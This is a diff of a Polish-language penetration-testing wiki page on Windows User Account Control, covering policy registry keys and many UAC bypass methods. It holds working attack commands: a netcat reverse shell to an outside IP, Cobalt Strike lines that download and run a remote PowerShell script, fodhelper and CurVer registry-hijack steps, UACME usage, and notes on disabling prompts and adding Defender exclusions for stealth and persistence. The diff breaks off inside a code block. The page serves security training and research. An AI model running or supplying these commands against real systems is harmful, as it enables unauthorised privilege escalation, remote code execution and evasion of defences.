@@ -4,58 +4,58 @@
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a funkcja, która umożliwia **prompt zgody dla podniesionych działań**. Applications mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogą potencjalnie skompromitować system**. Gdy UAC jest włączone, applications i tasks zawsze **uruchamiają się w security context konta niebędącego administratorem**, chyba że administrator wyraźnie autoryzuje te applications/tasks do uzyskania dostępu na poziomie administratora do uruchomienia w systemie. Jest to funkcja wygody, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogłyby potencjalnie narazić system na kompromitację**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście bezpieczeństwa konta nieadministracyjnego**, chyba że administrator wyraźnie autoryzuje te aplikacje/zadania do uzyskania dostępu do systemu na poziomie administratora. Jest to funkcja wygody, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.
 
-Więcej info o integrity levels:
+Więcej informacji o poziomach integrity:
 
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Gdy UAC jest włączone, użytkownik administratora dostaje 2 tokeny: standardowy klucz użytkownika, do wykonywania zwykłych akcji na zwykłym poziomie, oraz jeden z uprawnieniami admina.
+Gdy UAC jest aktywne, użytkownik będący administratorem otrzymuje 2 tokeny: token standardowego użytkownika do wykonywania zwykłych działań z poziomem medium integrity oraz token z uprawnieniami administratora.
 
-Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) omawia szczegółowo, jak działa UAC, i zawiera proces logowania, user experience oraz architekturę UAC. Administratorzy mogą używać security policies do konfiguracji działania UAC specyficznie dla swojej organizacji na poziomie lokalnym (za pomocą secpol.msc), albo skonfigurować je i rozpropagować przez Group Policy Objects (GPO) w środowisku Active Directory domain. Różne ustawienia są omówione szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można ustawić 10 Group Policy settings. Poniższa tabela zawiera dodatkowe szczegóły:
+Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC, w tym proces logowania, doświadczenia użytkownika i architekturę UAC. Administratorzy mogą używać zasad zabezpieczeń do konfigurowania działania UAC na poziomie lokalnym, zgodnie z potrzebami organizacji (za pomocą secpol.msc), albo konfigurować je i wdrażać za pośrednictwem obiektów zasad grupy (GPO) w środowisku domenowym Active Directory. Poszczególne ustawienia zostały szczegółowo omówione [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można skonfigurować 10 ustawień zasad grupy. Poniższa tabela zawiera dodatkowe informacje:
 
-| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
+| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru                | Ustawienie domyślne                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
-| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
-| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
-| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
-| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
-| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
-| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
-| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
-| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |
+| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
+| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na bezpiecznym pulpicie) |
+| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o poświadczenia na bezpiecznym pulpicie)         |
+| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
+| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
+| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
+| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
+| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
+| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
+| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |
 
-### Policies for installing software on Windows
+### Zasady instalowania oprogramowania w Windows
 
-**Lokalne polityki bezpieczeństwa** ("secpol.msc" na większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym adminami instalowanie software**. Oznacza to, że nawet jeśli użytkownik niebędący adminem może pobrać instalator twojego software, nie będzie mógł go uruchomić bez konta admina.
+**Lokalne zasady zabezpieczeń** („secpol.msc” w większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym administratorami instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik niebędący administratorem może pobrać instalator oprogramowania, nie będzie mógł go uruchomić bez konta administratora.
 
-### Registry Keys to Force UAC to Ask for Elevation
+### Klucze rejestru wymuszające monit UAC o podwyższenie uprawnień
 
-Jako standard user bez praw admina możesz upewnić się, że standardowe konto zostanie **poproszone przez UAC o credentials** podczas próby wykonania określonych działań. Ta akcja wymagałaby modyfikacji pewnych **registry keys**, do czego potrzebujesz uprawnień admina, chyba że istnieje **UAC bypass**, albo attacker jest już zalogowany jako admin.
+Jako standardowy użytkownik bez uprawnień administratora możesz dopilnować, aby konto „standardowe” otrzymywało **monit UAC o podanie poświadczeń**, gdy próbuje wykonać określone działania. Wymagałoby to zmodyfikowania określonych **kluczy rejestru**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** albo attacker jest już zalogowany jako administrator.
 
-Nawet jeśli użytkownik należy do grupy **Administrators**, te zmiany zmuszają użytkownika do **ponownego wpisania credentials konta**, aby wykonać działania administracyjne.
+Nawet jeśli użytkownik należy do grupy **Administrators**, zmiany te wymuszają **ponowne wprowadzenie poświadczeń konta** w celu wykonania działań administracyjnych.
 
-**Jedyną wadą jest to, że to podejście wymaga wyłączonego UAC, aby działało, co w środowiskach produkcyjnych jest mało prawdopodobne.**
+**W praktyce jest to przydatne tylko wtedy, gdy masz już elevated token, UAC bypass lub błędną konfigurację umożliwiającą zmianę tych kluczy; w przeciwnym razie sam zapis do rejestru zostanie zablokowany.**
 
-Registry keys i wpisy, które musisz zmienić, są następujące (z ich domyślnymi wartościami w nawiasach):
+Klucze rejestru i wpisy, które należy zmienić, są następujące (z wartościami domyślnymi w nawiasach):
 
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
 - `ConsentPromptBehaviorUser` = 1 (3)
 - `ConsentPromptBehaviorAdmin` = 1 (5)
 - `PromptOnSecureDesktop` = 1 (1)
 
-Można to również zrobić ręcznie przez narzędzie Local Security Policy. Po zmianie operacje administracyjne będą wymagać od użytkownika ponownego wpisania credentials.
+Można to również wykonać ręcznie za pomocą narzędzia Local Security Policy. Po wprowadzeniu zmian operacje administracyjne wymagają od użytkownika ponownego wprowadzenia poświadczeń.
 
-### Note
+### Uwaga
 
-**User Account Control nie jest granicą bezpieczeństwa.** Dlatego standard users nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez exploit local privilege escalation.
+**User Account Control nie jest granicą bezpieczeństwa.** Dlatego standardowi użytkownicy nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez wykorzystania local privilege escalation exploit.
 
-### Ask for 'full computer access' to a user
+### Poproś użytkownika o „pełny dostęp do komputera”
 ```powershell
 hostname | Set-Clipboard
 Enable-PSRemoting -SkipNetworkProfileCheck -Force
@@ -66,34 +66,50 @@ Enter-PSSession -ComputerName hostname
 ```
 ### UAC Privileges
 
-- Internet Explorer Protected Mode uses integrity checks to prevent high-integrity-level processes (like web browsers) from accessing low-integrity-level data (like the temporary Internet files folder). This is done by running the browser with a low-integrity token. When the browser attempts to access data stored in the low-integrity zone, the operating system checks the integrity level of the process and allows access accordingly. This feature helps prevent remote code execution attacks from gaining access to sensitive data on the system.
-- When a user logs on to Windows, the system creates an access token that contains a list of the user's privileges. Privileges are defined as the combination of a user's rights and capabilities. The token also contains a list of the user's credentials, which are credentials that are used to authenticate the user to the computer and to resources on the network.
+- Internet Explorer Protected Mode używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak przeglądarki internetowe) dostęp do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Osiąga się to przez uruchomienie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać atakom remote code execution, które mogłyby uzyskać dostęp do poufnych danych w systemie.
+- Gdy użytkownik loguje się do Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę poświadczeń użytkownika, czyli poświadczeń używanych do uwierzytelniania użytkownika na komputerze oraz do zasobów w sieci.
 
 ### Autoadminlogon
 
-To configure Windows to automatically log on a specific user at startup, set the **`AutoAdminLogon` registry key**. This is useful for kiosk environments or for testing purposes. Use this only on secure systems, as it exposes the password in the registry.
+Aby skonfigurować Windows do automatycznego logowania określonego użytkownika podczas uruchamiania, ustaw **`AutoAdminLogon registry key`**. Jest to przydatne w środowiskach kioskowych lub do celów testowych. Używaj tej funkcji wyłącznie w bezpiecznych systemach, ponieważ ujawnia ona hasło w rejestrze.
 
-Set the following keys using the Registry Editor or `reg add`:
+Ustaw następujące klucze za pomocą Registry Editor lub `reg add`:
 
 - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
 - `AutoAdminLogon` = 1
 - `DefaultUsername` = username
 - `DefaultPassword` = password
 
-To revert to normal logon behavior, set `AutoAdminLogon` to 0.
+Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.
 
 ## UAC bypass
 
 > [!TIP]
-> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears
+> Pamiętaj, że jeśli masz dostęp graficzny do ofiary, UAC bypass jest prosty, ponieważ możesz po prostu kliknąć „Yes”, gdy pojawi się monit UAC
 
-The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
+UAC bypass jest potrzebny w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście o średnim poziomie integralności, a Twój użytkownik należy do grupy administratorów**.
 
-It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**
+Należy wspomnieć, że **znacznie trudniej jest wykonać UAC bypass, jeśli UAC działa na najwyższym poziomie zabezpieczeń (Always), niż jeśli działa na którymkolwiek z pozostałych poziomów (Default).**
 
-### UAC disabled
+### Fast triage from a medium-integrity shell
 
-If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
+Przed próbą wykonania bypass potwierdź, że znajdujesz się w odpowiednim scenariuszu, i dopasuj build hosta do znanych działających metod:
+```powershell
+whoami /groups
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
+powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
+schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+```
+Praktyczne uwagi:
+- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
+- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / bypassów opartych na COM.
+- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować dokładny build zamiast zakładać niepowodzenie: UACME nadal śledzi niektóre metody `AlwaysNotify compatible` na nowoczesnych buildach Windows.
+
+### UAC wyłączone
+
+Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` wynosi **`0`**), możesz **wykonać reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -104,9 +120,9 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Very** Basic UAC "bypass" (pełny dostęp do systemu plików)
+### **Bardzo** podstawowy UAC "bypass" (pełny dostęp do systemu plików)
 
-Jeśli masz shell z użytkownikiem, który należy do grupy Administrators, możesz **zamontować udział C$** udostępniony przez SMB (system plików) lokalnie jako nowy dysk i będziesz mieć **dostęp do wszystkiego w systemie plików** (nawet folderu domowego Administratora).
+Jeśli masz shell z użytkownikiem należącym do grupy Administrators, możesz lokalnie zamontować współdzielony zasób **C$** przez SMB (system plików) jako nowy dysk i uzyskasz **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego użytkownika Administrator).
 
 > [!WARNING]
 > **Wygląda na to, że ten trik już nie działa**
@@ -117,9 +133,9 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-### UAC bypass z cobalt strike
+### UAC bypass with cobalt strike
 
-Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom bezpieczeństwa
+Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom zabezpieczeń
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -131,18 +147,27 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** i **Metasploit** również mają kilka modułów do **bypass** **UAC**.
+**Empire** i **Metasploit** również mają kilka modułów do **bypass**owania **UAC**.
+
+### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)
+
+Auto-elevated obiekty COM nadal stanowią praktyczną powierzchnię UAC na współczesnych buildach. `ICMLuaUtil` jest nadal oznaczany przez UACME jako działający w obecnych gałęziach Windows, a narzędzia ofensywne wciąż dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonywanie 64-bitowe i czasami podszywanie się pod PEB/proces przed wywołaniem COM Elevation Moniker.
+
+Praktyczne wskazówki:
+- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
+- Jeśli surowa powłoka zawiedzie, ponów próbę z poziomu implementacji BOF / UACME zamiast naiwnego wrappera `CreateProcess`.
+- Załóż, że wykonywanie procesu potomnego nastąpi w **oddzielnym procesie z podniesionymi uprawnieniami**; wiele BOF nie podnosi uprawnień bieżącego beacona bezpośrednio.
 
 ### KRBUACBypass
 
-Dokumentacja i narzędzie w [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Dokumentacja i narzędzie są dostępne pod adresem [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
-[**UACME** ](https://github.com/hfiref0x/UACME), które jest **kompilacją** kilku UAC bypass exploits. Zwróć uwagę, że będziesz musiał **skompilować UACME używając visual studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (takich jak `Source\Akagi\outout\x64\Debug\Akagi.exe`) , musisz wiedzieć **który z nich potrzebujesz.**\
-Powinieneś **uważać**, ponieważ niektóre bypasses będą **uruchamiać inne programy**, które będą **alarmować** **użytkownika**, że coś się dzieje.
+[**UACME** ](https://github.com/hfiref0x/UACME), które jest **zbiorem** kilku exploitów UAC bypass. Pamiętaj, że musisz **skompilować UACME za pomocą Visual Studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (takich jak `Source\Akagi\outout\x64\Debug\Akagi.exe`), a Ty będziesz musiał wiedzieć, **którego potrzebujesz.**\
+Należy zachować **ostrożność**, ponieważ niektóre bypasses będą **wyświetlać monity innych programów**, które **poinformują** **użytkownika**, że coś się dzieje.
 
-UACME ma **wersję build**, od której każda technika zaczęła działać. Możesz wyszukać technikę wpływającą na twoje wersje:
+UACME zawiera **wersję builda, od której każda technika zaczęła działać**. Możesz wyszukać technikę wpływającą na używane przez Ciebie wersje:
 ```powershell
 PS C:\> [environment]::OSVersion.Version
 
@@ -150,18 +175,26 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
+Ponadto, korzystając z [tej](https://en.wikipedia.org/wiki/Windows_10_version_history) strony, można określić wersję wydania Windows `1607` na podstawie numerów kompilacji.
 
-### UAC Bypass – fodhelper.exe (Registry hijack)
+Praktyczny przebieg pracy polega na tym, aby najpierw **ocenić kompilację hosta**, a dopiero potem uruchomić pasującą metodę:
+```cmd
+python main.py --scan uac
+Akagi64.exe 33 C:\Windows\System32\cmd.exe
+```
+- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co pozwala szybko odrzucić nieaktualne PoC.
+- `UACME` nadal pozostaje najlepszym publicznym katalogiem do mapowania bypassu na konkretny build. Najnowsze wydania dodały nowe metody i ponownie przetestowały istniejące na **Windows 11 25H2**, dlatego przed założeniem, że stary wpis na blogu nadal ma zastosowanie bez zmian, sprawdź ponownie README i informacje o wydaniu.
 
-Zaufany binarny plik `fodhelper.exe` jest auto-elevated na nowoczesnym Windows. Po uruchomieniu sprawdza poniższą ścieżkę rejestru per-user bez weryfikacji verbu `DelegateExecute`. Umieszczenie tam komendy pozwala procesowi o Medium Integrity (user jest w Administrators) uruchomić proces o High Integrity bez promptu UAC.
+### UAC Bypass – fodhelper.exe (przejęcie rejestru)
 
-Ścieżka rejestru sprawdzana przez fodhelper:
+Zaufany plik binarny `fodhelper.exe` jest automatycznie uruchamiany z podwyższonymi uprawnieniami w nowoczesnym Windows. Po uruchomieniu odpy tuje poniższą ścieżkę rejestru użytkownika bez sprawdzania czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie Medium Integrity (użytkownik należy do grupy Administrators) uruchomić proces o poziomie High Integrity bez monitu UAC.
+
+Ścieżka rejestru odpytywana przez fodhelper:
 ```text
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
 <details>
-<summary>Kroki PowerShell (ustaw swój payload, a potem uruchom)</summary>
+<summary>Kroki w PowerShellu (ustaw payload, a następnie go uruchom)</summary>
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
 C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
@@ -182,13 +215,13 @@ Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Forc
 ```
 </details>
 Uwagi:
-- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators i poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
-- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu na 64-bitowym Windows.
-- Payload może być dowolną komendą (PowerShell, cmd lub ścieżka do EXE). Unikaj wywoływania UI dla większej stealth.
+- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators, a poziom UAC jest ustawiony domyślnie/łagodnie (nie na Always Notify z dodatkowymi ograniczeniami).
+- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
+- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do pliku EXE). Aby zachować stealth, unikaj interfejsów UI wyświetlających monity.
 
 #### Wariant hijack CurVer/extension (tylko HKCU)
 
-Nowsze próbki wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** przez per-user wartość `CurVer`. Binarka auto-elevated nadal rozwiązuje handler w `HKCU`, więc nie jest potrzebny token admina, aby dodać klucze:
+Nowsze samples wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Auto-elevated binary nadal wyszukuje handler w `HKCU`, więc do utworzenia kluczy nie jest wymagany token administratora:
 ```powershell
 # Point ms-settings to a custom extension (.thm) and map that extension to our payload
 New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
@@ -197,76 +230,100 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Valu
 
 Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
 ```
-Po podniesieniu uprawnień malware często **wyłącza przyszłe monity** przez ustawienie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania w zakresie defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z wysoką integralnością. Typowe zadanie persistence przechowuje na dysku **skrypt PowerShell zaszyfrowany XOR** i co godzinę dekoduje go oraz wykonuje w pamięci:
+Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania mające na celu uniknięcie detekcji (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z wysokim poziomem integralności. Typowe zadanie persistence przechowuje na dysku **XOR-encrypted PowerShell script**, a następnie co godzinę dekoduje go i wykonuje w pamięci:
 ```powershell
